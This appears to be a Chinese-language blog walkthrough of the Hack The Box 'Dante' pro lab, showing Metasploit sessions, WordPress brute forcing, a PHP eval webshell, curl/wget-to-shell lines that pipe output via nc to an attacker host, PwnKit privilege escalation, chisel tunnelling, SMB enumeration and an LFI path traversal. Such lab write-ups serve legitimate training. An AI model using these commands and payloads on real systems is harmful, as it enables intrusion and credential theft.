<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  73.30% <span class="k">done</span> <span class="o">(</span>74950/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  74.77% <span class="k">done</span> <span class="o">(</span>76449/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  76.24% <span class="k">done</span> <span class="o">(</span>77948/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  77.70% <span class="k">done</span> <span class="o">(</span>79447/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  79.17% <span class="k">done</span> <span class="o">(</span>80946/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  80.63% <span class="k">done</span> <span class="o">(</span>82445/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  82.10% <span class="k">done</span> <span class="o">(</span>83944/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  83.57% <span class="k">done</span> <span class="o">(</span>85443/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  85.03% <span class="k">done</span> <span class="o">(</span>86942/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  86.50% <span class="k">done</span> <span class="o">(</span>88441/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  87.96% <span class="k">done</span> <span class="o">(</span>89940/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  89.43% <span class="k">done</span> <span class="o">(</span>91439/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  90.90% <span class="k">done</span> <span class="o">(</span>92938/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  92.36% <span class="k">done</span> <span class="o">(</span>94437/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  93.83% <span class="k">done</span> <span class="o">(</span>95936/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  95.29% <span class="k">done</span> <span class="o">(</span>97435/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  96.76% <span class="k">done</span> <span class="o">(</span>98934/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  98.19% <span class="k">done</span> <span class="o">(</span>100400/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  99.59% <span class="k">done</span> <span class="o">(</span>101827/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress - 100.00% <span class="k">done</span> <span class="o">(</span>102246/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>175686 bytes<span class="o">)</span> to 10.10.110.3
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 16 opened <span class="o">(</span>10.10.14.5:4444 -&gt; 10.10.110.3:19751<span class="o">)</span> at 2024-01-01 22:48:21 <span class="nt">-0500</span>
</code></pre></div></div>

<p>获得 shell 后在 c:\Users 目录中可以发现 flag.txt</p>
<h2 id="提权-printspooler">提权: PrintSpooler</h2>
<p>MSSQL 用户一般拥有 SeImpersonatePrivilege 权限，可以使用 Potato 家族提权，MSF 中可以直接使用 getsystem 命令。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> getsystem 
...got system via technique 5 <span class="o">(</span>Named Pipe Impersonation <span class="o">(</span>PrintSpooler variant<span class="o">))</span><span class="nb">.</span>
</code></pre></div></div>

<h1 id="参考">参考</h1>
<ul>
  <li><a href="https://mega.nz/folder/J7VSgZiD#WzxgZ6mpK8YXotGDFQRWww">Dante by Tamarisk</a></li>
  <li><a href="https://blog.snert.cn/index.php/2023/05/16/htb-dante-walkthrough/">HTB Dante Walkthrough – rainb0w’s blog</a></li>
  <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress">Wordpress - HackTricks</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="Pentest" /><category term="HTB" /><category term="MS17-010" /><category term="LPE" /><summary type="html"><![CDATA[信息收集 fscan └─$ fscan -h 10.10.110.0/24 ___ _ / _ \ ___ ___ _ __ __ _ ___| | __ / /_\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\_____\__ \ (__| | | (_| | (__| &lt; \____/ |___/\___|_| \__,_|\___|_|\_\ fscan version: 1.8.2 start infoscan trying RunIcmp2 The current user permissions unable to send icmp packets start ping (icmp) Target 10.10.110.2 is alive (icmp) Target 10.10.110.100 is alive [*] Icmp alive hosts len is: 2 10.10.110.100:21 open 10.10.110.100:22 open [*] alive ports len is: 2 start vulscan [+] ftp://10.10.110.100:21:anonymous 存活主机： 10.10.110.2 10.10.110.100 ftp://10.10.110.100:21 允许匿名登陆。 对 10.10.110.100 进行全端口扫描，注意需要加上 sudo， sudo nmap -T4 -sC -sV -p- --min-rate=1000 10.10.110.100 nmap 扫描结果中有一个 flag，65000 开放了一个 apache2，上面运行了一个 wordpress 服务。 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.14.2 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can't get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA) | 256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA) |_ 256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519) 65000/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) | http-robots.txt: 2 disallowed entries |_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!} |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ftp 匿名登陆 ftp 允许匿名登陆，一开始会出现： 229 Entering Extended Passive Mode (|||58413|) 等待一段时间后可以正常执行命令。Transfer/Incoming 中有一个 todo.txt 内容如下： - Finalize Wordpress permission changes - PENDING - Update links to to utilize DNS Name prior to changing to port 80 - PENDING - Remove LFI vuln from the other site - PENDING - Reset James' password to something more secure - PENDING - Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS wordpress 后台 getshell 使用 wpscan 扫描。 wpscan --url http://10.10.110.100:65000/wordpress --enumerate 版本为 WordPress version 5.4.1，没有找到存在漏洞的插件，存在用户 admin 和 james。 [+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100] [+] Started: Fri Dec 22 22:12:24 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | Reference: https://codex.wordpress.org/Debugging_in_WordPress [+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29). | Found By: Atom Generator (Aggressive Detection) | - http://10.10.110.100:65000/wordpress/?feed=atom, &lt;generator uri="https://wordpress.org/" version="5.4.1"&gt;WordPress&lt;/generator&gt; | Confirmed By: Style Etag (Aggressive Detection) | - http://10.10.110.100:65000/wordpress/wp-admin/load-styles.php, Match: '5.4.1' [i] The main theme could not be detected. [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [i] User(s) Identified: [+] admin | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://10.10.110.100:65000/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] james | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register todo.txt 中指出 james 的密码不太安全，可以考虑爆破 james 的密码。字典可以使用 rockyou.txt，但很久都没爆出来。 wpscan --url http://10.10.110.100:65000/wordpress -U james -P /webtools/dicts/rockyou.txt --proxy http://127.0.0.1:8080 参考 Tamarisk 的 writeup，也可以考虑使用页面的内容或者其他敏感内容生成字典，实在爆破不出来时可以考虑这种方法。cewl 是一个用于生成自定义单词列表的工具,可以爬取指定 URL 的网页内容，返回一个单词列表，用生成的字典爆破之后可以得到密码 Toyota。该密码也在 rockyou.txt ，但表单的爆破确实比较慢。 cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks &gt; words.txt 以 james 用户进入后台后，james 正好属于 Administrator。Wordpress 后台 getshell 的相关利用方法可以参考：Wordpress - HackTricks，主要有以下的几种方法： 修改主题模板。 修改插件文件。 上传插件。 访问 /wordpress/wp-admin/theme-editor.php?file=404.php&amp;theme=twentytwenty 修改 404.php。添加一句话： eval($_POST["pass"]); 但保存时得到Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP. 的错误，该报错是 Wordpress 4.9 之后添加的功能，会在 WP 文件编辑器中无法修改 php 文件。 使用 Plugin Editor 修改插件文件时可以正常保存，例如修改 akismet/class.akismet-cli.php。修改后访问：/wordpress/wp-content/plugins/akismet/class.akismet-cli.php 即可。 MSF 中也集成了相关 exp，但好像没法正常上传 payload。 use exploit/unix/webapp/wp_admin_shell_upload msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set lhost 10.10.14.5 msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set lport 3333 msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set PASSWORD Toyota msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set USERNAME james msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set targeturi /wordpress msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set rhosts 10.10.110.100 msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set rport 65000 msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit [*] Started reverse TCP handler on 10.10.14.5:4444 [*] Authenticating with WordPress using james:Toyota... [+] Authenticated with WordPress [*] Preparing payload... [*] Uploading payload... [*] Executing the payload at /wordpress/wp-content/plugins/bpjosOzqKn/skfipPVLfx.php... [!] This exploit may require manual cleanup of 'skfipPVLfx.php' on the target [!] This exploit may require manual cleanup of 'bpjosOzqKn.php' on the target [!] This exploit may require manual cleanup of '../bpjosOzqKn' on the target [*] Exploit completed, but no session was created. 获取到 webshell 之后开始本地环境的信息收集。 内网 ip 172.16.1.100, 网关 172.16.1.1，其他主机 172.16.1.20 本地存在 mysql 服务。可以在 wp-config 中拿到用户名密码：shaun/password，但数据库中似乎没有什么有用的信息。 define( 'DB_NAME', 'wordpress' ); /** MySQL database username */ define( 'DB_USER', 'shaun' ); /** MySQL database password */ define( 'DB_PASSWORD', 'password' ); james 用户目录下有一个 flag.txt，但仅能够以 james 用户的身份读取。可以想办法获取 james 用户的密码，或者提权到 root 后在切换到 james 用户。 linux 提权 全面收集信息可以使用 linPEAS 或者 lse # linPEAS nc -lvnp 9002 | tee linpeas.out #Host curl 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002 #Victim # lse nc -lvnp 9002 | tee lse.out #Host bash &lt;(wget -q -O - "http://10.10.14.5:9999/lse_cve.sh") -l1 -i | nc 10.10.14.5 9002 #Victim bash &lt;(wget -q -O - "http://10.10.14.5:9999/lse_cve.sh") -l2 -i | nc 10.10.14.5 9002 #Victim 除了 james 之外还有一个 balthazar 用户。linPEAS 在 james 的 bash_history 文件中找到了一个密码。 ╔══════════╣ Searching passwords in history files /home/james/.bash_history:rm .mysql_history /home/james/.bash_history:mysql -u balthazar -p TheJoker12345! 使用该密码可以正常登陆 ssh，结合前面使用 linPEAS 的结果，目标存在多个提权漏洞： [+] [CVE-2022-2586] nft_object UAF Details: https://www.openwall.com/lists/oss-security/2022/08/29/5 Exposure: probable Tags: [ ubuntu=(20.04) ]{kernel:5.12.13} Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1 Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN) [+] [CVE-2021-4034] PwnKit Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt Exposure: probable Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main [+] [CVE-2021-3156] sudo Baron Samedit Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt Exposure: probable Tags: mint=19,[ ubuntu=18|20 ], debian=10 Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main [+] [CVE-2021-3156] sudo Baron Samedit 2 Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt Exposure: probable Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10 Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main [+] [CVE-2021-22555] Netfilter heap out-of-bounds write Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html Exposure: probable Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*} Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c Comments: ip_tables kernel module must be loaded [+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET) Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/ https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/ Exposure: less probable Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN) 使用 Pwnkit 可以成功提权到 root，从而可以读取 james 的 flag。 balthazar@DANTE-WEB-NIX01:~/Downloads/.tmp$ ./PwnKit root@DANTE-WEB-NIX01:/home/balthazar/Downloads/.tmp# whoami root root@DANTE-WEB-NIX01:/home/balthazar/Downloads/.tmp# cat /home/james/flag.txt DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!} root@DANTE-WEB-NIX01:/home/balthazar/Downloads/.tmp# root 目录下也有一个 flag.txt root@DANTE-WEB-NIX01:~# ls flag.txt snap wordpress.tar.bz2 wordpress_backup root@DANTE-WEB-NIX01:~# cat flag.txt DANTE{Too_much_Pr1v!!!!} Tunnel 搭建 chisel 使用 pwncat-cs 连接 ssh，上传 chisel pwncat-cs 'ssh://balthazar:TheJoker12345!@10.10.110.100' upload chisel xxx 首先使用 chisel 构建 socks 隧道。 ./chisel server -p 12345 --reverse # local ./chisel client 10.10.14.5:12345 R:0.0.0.0:1080:socks # remote msf 也可以使用 msf meterpreter 来构建 socks 隧道： use multi/manage/autoroute set session 1 exploit use auxiliary/server/socks_proxy set SRVPORT 9090 exlpoit -j 内网资产扫描 在建立了隧道的基础上就可以对内网进行资产扫描了 fscan 比较高效的是 fscan，配合 fscanOutPut 可以将结果以表格的方式进行统计。fscan 支持 -socks5 参数来指定代理： fscan -h 172.16.1.0/24 -socks5 127.0.0.1:1080 Goby Goby 的图形化界面更加方便分析。代理扫描时，使用 socks 代理。 总共 11 个 IP，同样也扫描出了 MS17-010 Ehole: 指纹识别 ehole 可以对 web 服务进行进一步的指纹扫描，同样支持 -socks 参数进行代理扫描。 ehole finger -l webapp.txt --proxy socks5://127.0.0.1:1080 [ https://172.16.1.1 | | nginx | 200 | 8889 | pfSense - LoginpfSense Logo ] [ https://172.16.1.1/ | | nginx | 200 | 8889 | pfSense - LoginpfSense Logo ] [ http://172.16.1.1 | | nginx | 200 | 8999 | pfSense - LoginpfSense Logo ] [ http://172.16.1.102 | OpenSSL | Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0 | 200 | 1237 | Dante Marriage Registration System :: Home Page ] [ http://172.16.1.19 | 列目录 | Apache/2.4.41 (Ubuntu) | 200 | 553 | Index of / ] [ http://172.16.1.12/dashboard/ | XAMPP 默认页面,Perl,rums(科创站群管理平台),mod_perl,OpenSSL | Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP ] [ http://172.16.1.17 | 列目录 | Apache/2.4.41 (Ubuntu) | 200 | 963 | Index of / ] [ http://172.16.1.20 | | Microsoft-IIS/8.5 | 200 | 3173 | ] [ http://172.16.1.100 | Apache2 Ubuntu 默认页 | Apache/2.4.41 (Ubuntu) | 200 | 10918 | Apache2 Ubuntu Default Page: It works ] [ http://172.16.1.13/dashboard/ | XAMPP 默认页面,rums(科创站群管理平台),OpenSSL | Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP ] [ http://172.16.1.10 | wordpress | Apache/2.4.41 (Ubuntu) | 200 | 28842 | Dante Hosting ] [ https://172.16.1.102 | OpenSSL | Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0 | 200 | 1237 | Dante Marriage Registration System :: Home Page ] [ https://172.16.1.13/dashboard/ | XAMPP 默认页面,rums(科创站群管理平台),OpenSSL | Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP ] [ https://172.16.1.12/dashboard/ | XAMPP 默认页面,Perl,rums(科创站群管理平台),mod_perl,OpenSSL | Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP ] [ http://172.16.1.12 | XAMPP 默认页面,Perl,rums(科创站群管理平台),mod_perl,OpenSSL | Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP ] [ http://172.16.1.13 | XAMPP 默认页面,rums(科创站群管理平台),OpenSSL | Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP ] [ https://172.16.1.13 | XAMPP 默认页面,rums(科创站群管理平台),OpenSSL | Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP ] [ https://172.16.1.12 | XAMPP 默认页面,Perl,rums(科创站群管理平台),mod_perl,OpenSSL | Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP ] [ http://172.16.1.19:8080 | Jenkins,Hudson,Jenkins | Jetty(9.4.27.v20200227) | 403 | 793 | ] [ http://172.16.1.19:8080/login?from=%2F' | Jenkins,Hudson,Jenkins | Jetty(9.4.27.v20200227) | 200 | 2019 | Sign in [Jenkins] ] 资产概况 存活 IP 及端口： 172.16.1.5 172.16.1.5 21 172.16.1.5 135 172.16.1.5 139 172.16.1.5 445 172.16.1.5 1433 172.16.1.13 172.16.1.13 80 172.16.1.13 443 172.16.1.13 445 172.16.1.102 172.16.1.102 80 172.16.1.102 135 172.16.1.102 139 172.16.1.102 443 172.16.1.102 445 172.16.1.102 3306 172.16.1.10 172.16.1.10 22 172.16.1.10 80 172.16.1.10 139 172.16.1.10 445 172.16.1.17 172.16.1.17 80 172.16.1.17 139 172.16.1.17 445 172.16.1.17 10000 172.16.1.101 172.16.1.101 21 172.16.1.101 135 172.16.1.101 139 172.16.1.101 445 172.16.1.3 172.16.1.3 22 172.16.1.20 172.16.1.20 80 172.16.1.20 22 172.16.1.20 135 172.16.1.20 139 172.16.1.20 443 172.16.1.20 445 172.16.1.20 88 172.16.1.19 172.16.1.19 80 172.16.1.19 8080 172.16.1.19 8443 172.16.1.19 8888 172.16.1.12 172.16.1.12 21 172.16.1.12 80 172.16.1.12 22 172.16.1.12 443 172.16.1.12 3306 172.16.1.1 172.16.1.1 22 172.16.1.1 80 172.16.1.1 443 172.16.1.100 172.16.1.100 22 172.16.1.100 21 172.16.1.100 80 10.10.110.100 10.10.110.100 21 10.10.110.100 22 无凭证域内信息收集 cme 收集 SMB 及域信息。 定位域控 寻找域内用户名 是否可以匿名枚举 SMB、FTP 等 ASREProast Password Spray 匿名枚举 ftp cme 收集 SMB 及域信息 p crackmapexec smb 172.16.1.0/24 结果如下： SMB 172.16.1.5 445 DANTE-SQL01 [*] Windows Server 2016 Standard 14393 x64 (name:DANTE-SQL01) (domain:DANTE-SQL01) (signing:False) (SMBv1:True) SMB 172.16.1.20 445 DANTE-DC01 [*] Windows Server 2012 R2 Standard 9600 x64 (name:DANTE-DC01) (domain:DANTE.local) (signing:True) (SMBv1:True) SMB 172.16.1.10 445 DANTE-NIX02 [*] Windows 6.1 Build 0 (name:DANTE-NIX02) (domain:) (signing:False) (SMBv1:False) SMB 172.16.1.17 445 DANTE-NIX03 [*] Windows 6.1 Build 0 (name:DANTE-NIX03) (domain:) (signing:False) (SMBv1:False) SMB 172.16.1.101 445 DANTE-WS02 [*] Windows 10.0 Build 18362 x64 (name:DANTE-WS02) (domain:DANTE-WS02) (signing:False) (SMBv1:False) SMB 172.16.1.102 445 DANTE-WS03 [*] Windows 10.0 Build 19041 x64 (name:DANTE-WS03) (domain:DANTE-WS03) (signing:False) (SMBv1:False) SMB 172.16.1.13 445 DANTE-WS01 [*] Windows 10.0 Build 18362 (name:DANTE-WS01) (domain:DANTE-WS01) (signing:False) (SMBv1:False) 从结果中可以看到存在 DANTE.local 域，并且 DC 为 172.16.1.20。 前面的探测结果中可知 DC 上存在永恒之蓝漏洞。 除了 DC 之外，其他的主机均未开启 SMB 强制签名，存在 Relay 的可能性。 匿名枚举用户名 匿名枚举用户名可以使用 cme 或者 enum4linux。 p crackmapexec smb 172.16.1.20 --users p enum4linux 172.16.1.20 需要认证，因此没有得到结果。 └─$ p crackmapexec smb 172.16.1.20 --users [proxychains] config file found: /mnt/share/project/HTB/ProLab/Dante/proxychains.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 SMB 172.16.1.20 445 DANTE-DC01 [*] Windows Server 2012 R2 Standard 9600 x64 (name:DANTE-DC01) (domain:DANTE.local) (signing:True) (SMBv1:True) SMB 172.16.1.20 445 DANTE-DC01 [-] Error enumerating domain users using dc ip 172.16.1.20: NTLM needs domain\username and a password SMB 172.16.1.20 445 DANTE-DC01 [*] Trying with SAMRPC protocol 匿名枚举 SMB 如果 SMB 允许匿名访问，我们没准可以获取一些敏感消息。 p crackmapexec smb 172.16.1.0/24 -u anonymous -p '' --shares 结果如下： SMB 172.16.1.5 445 DANTE-SQL01 [*] Windows Server 2016 Standard 14393 x64 (name:DANTE-SQL01) (domain:DANTE-SQL01) (signing:False) (SMBv1:True) SMB 172.16.1.20 445 DANTE-DC01 [*] Windows Server 2012 R2 Standard 9600 x64 (name:DANTE-DC01) (domain:DANTE.local) (signing:True) (SMBv1:True) SMB 172.16.1.10 445 DANTE-NIX02 [*] Windows 6.1 Build 0 (name:DANTE-NIX02) (domain:) (signing:False) (SMBv1:False) SMB 172.16.1.17 445 DANTE-NIX03 [*] Windows 6.1 Build 0 (name:DANTE-NIX03) (domain:) (signing:False) (SMBv1:False) SMB 172.16.1.5 445 DANTE-SQL01 [-] DANTE-SQL01\anonymous: STATUS_LOGON_FAILURE SMB 172.16.1.102 445 DANTE-WS03 [*] Windows 10.0 Build 19041 x64 (name:DANTE-WS03) (domain:DANTE-WS03) (signing:False) (SMBv1:False) SMB 172.16.1.101 445 DANTE-WS02 [*] Windows 10.0 Build 18362 x64 (name:DANTE-WS02) (domain:DANTE-WS02) (signing:False) (SMBv1:False) SMB 172.16.1.20 445 DANTE-DC01 [-] DANTE.local\anonymous: STATUS_LOGON_FAILURE SMB 172.16.1.10 445 DANTE-NIX02 [+] \anonymous: SMB 172.16.1.17 445 DANTE-NIX03 [+] \anonymous: SMB 172.16.1.10 445 DANTE-NIX02 [+] Enumerated shares SMB 172.16.1.10 445 DANTE-NIX02 Share Permissions Remark SMB 172.16.1.10 445 DANTE-NIX02 ----- ----------- ------ SMB 172.16.1.10 445 DANTE-NIX02 print$ Printer Drivers SMB 172.16.1.10 445 DANTE-NIX02 SlackMigration READ SMB 172.16.1.10 445 DANTE-NIX02 IPC$ IPC Service (DANTE-NIX02 server (Samba, Ubuntu)) SMB 172.16.1.13 445 DANTE-WS01 [*] Windows 10.0 Build 18362 (name:DANTE-WS01) (domain:DANTE-WS01) (signing:False) (SMBv1:False) SMB 172.16.1.102 445 DANTE-WS03 [-] DANTE-WS03\anonymous: STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\anonymous: STATUS_LOGON_FAILURE SMB 172.16.1.17 445 DANTE-NIX03 [+] Enumerated shares SMB 172.16.1.17 445 DANTE-NIX03 Share Permissions Remark SMB 172.16.1.17 445 DANTE-NIX03 ----- ----------- ------ SMB 172.16.1.17 445 DANTE-NIX03 forensics READ,WRITE SMB 172.16.1.17 445 DANTE-NIX03 IPC$ IPC Service (DANTE-NIX03 server (Samba, Ubuntu)) SMB 172.16.1.13 445 DANTE-WS01 [-] DANTE-WS01\anonymous: STATUS_LOGON_FAILURE 允许 SMB 匿名访问的有两台主机： 172.16.1.10 SlackMigration 可读 172.16.1.17 forensics 可读可写 我们可以使用 smbclient 进行连接。 p smbclient \\\\172.16.1.10\\SlackMigration -U "anonymous%" 172.16.1.10 中 SlackMigration 共享中存在一个 admintasks.txt 文件，相当于提示信息。 -Remove wordpress install from web root - PENDING -Reinstate Slack integration on Ubuntu machine - PENDING -Remove old employee accounts - COMPLETE -Inform Margaret of the new changes - COMPLETE -Remove account restrictions on Margarets account post-promotion to admin - PENDING 从中我们可以得出如下的信息： 172.16.1.10 中部署的 wordpress 服务以 root 权限运行。 用户 Margarets 具备管理员权限。 连接 172.16.1.17 forensics p smbclient \\\\172.16.1.17\\forensics -U "anonymous%" 可以在其中发现一个 monitor 文件。 └─$ file monitor monitor: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535) monitor 是一个 pcap 文件，使用 wireshark 打开。过滤 http 报文可以发现流量中存在部分认证消息。 admin/password6543 admin/Password6543 Linux: 172.16.1.10 80 端口文件包含导致 RCE http://172.16.1.10/nav.php?page=about.html page 参数存在目录穿越，导致任意文件读取。 http://172.16.1.10/nav.php?page=../../../../../../../etc/passwd 结果如下： root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync 